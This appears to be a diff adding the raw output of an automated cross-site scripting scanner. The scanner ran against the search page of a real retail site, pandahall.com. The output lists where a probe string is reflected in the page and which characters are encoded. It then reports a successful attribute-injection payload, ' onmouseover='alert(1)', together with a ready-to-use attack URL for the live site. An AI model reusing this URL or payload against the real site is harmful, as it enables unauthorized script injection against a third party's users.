@@ -1,0 +1,112 @@
+https://www.pandahall.com/Customer/SignIn?q=reg
+
+GET Params:[2]
+['keyword', 'ph_source_from']
+_______________________________________________________________________________________________________
+https://www.pandahall.com/ProductSearch?keyword=(uvw"xyz'yxz</zxy&ph_source_from=advanced_search
+
+----------------------------------------------------------------------------------
+Attribute Context: [2]
+<input type="text" autocomplete="off" id="searchProduct" name="keyword" class="search_input" maxlength="200" placeholder="Search in 600,000+ Products" value='(uvw&#034;xyz&#039;yxz&lt;/zxy' style="border-right:none;" />
+<input type="hidden" id="searchKeyword" value="(uvw&quot;xyz'yxz&lt;/zxy" />
+
+----------------------------------------------------------------------------------
+HTML Context: [2]
+<title>Find (uvw&#034;xyz&#039;yxz&lt;/zxy on Pandahall.com</title>
+<span style="color: #df8402; word-wrap: break-word;">(uvw&#034;xyz&#039;yxz&lt;/zxy</span>
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [7]
+<a href="https://www.pandahall.com/ProductSearch?keyword=%28uvw%22xyz%27yxz%3C%2Fzxy">
+<a href="https://www.pandahall.com/ProductSearch?keyword=%28uvw%22xyz'yxz%3C/zxy&page=1">
+<a href="https://www.pandahall.com/ProductSearch?keyword=%28uvw%22xyz'yxz%3C/zxy&page=1&batchType=1">
+<a href="https://www.pandahall.com/ProductSearch?keyword=%28uvw%22xyz'yxz%3C/zxy&page=1&batchType=2">
+<a href="https://www.pandahall.com/ProductSearch?keyword=%28uvw%22xyz'yxz%3C/zxy&page=1&batchType=3">
+<meta name="keywords" content="(uvw&#034;xyz&#039;yxz&lt;/zxy Wholesale, Cheap (uvw&#034;xyz&#039;yxz&lt;/zxy, bulk (uvw&#034;xyz&#039;yxz&lt;/zxy, US, UK, Metropolitan France, Germany, Italy, Canada, Japan, Russia" />
+<meta name="description" content="Search and buy (uvw&#034;xyz&#039;yxz&lt;/zxy from Pandahall.com with high quality and cheap price. Delivery to US, UK, Metropolitan France, Germany, Italy, Canada, Japan, Russia." />
+
+----------------------------------------------------------------------------------
+
+
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	True	True	False
+
+Attack Payloads for ATTR
+[]
+ENCODING     Presence	"	'	<	( 
+ATTR:		True	True	False	True	False
+
+Attack Payloads for ATTR
+["' onmouseover='alert(1)"]
+
+ATTR Attack Url: https://www.pandahall.com/ProductSearch?keyword=' onmouseover='alert(1)&ph_source_from=advanced_search
+
+=> ATTACK SUCCESSFUL with Payload: ' onmouseover='alert(1)
+Detection of Payload: 
+<input type="hidden" id="searchKeyword" value="' onmouseover='alert(1)" />
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+HTML:		True	True	True	True	False
+
+Attack Payloads for HTML
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	False
+
+Attack Payloads for URL
+[]
+_______________________________________________________________________________________________________
+https://www.pandahall.com/ProductSearch?keyword=&ph_source_from=(uvw"xyz'yxz</zxy
+
+----------------------------------------------------------------------------------
+Attribute Context: [0]
+
+----------------------------------------------------------------------------------
+HTML Context: [0]
+
+----------------------------------------------------------------------------------
+Script Context: [0]
+
+----------------------------------------------------------------------------------
+URI Context: [0]
+
+----------------------------------------------------------------------------------
+
+
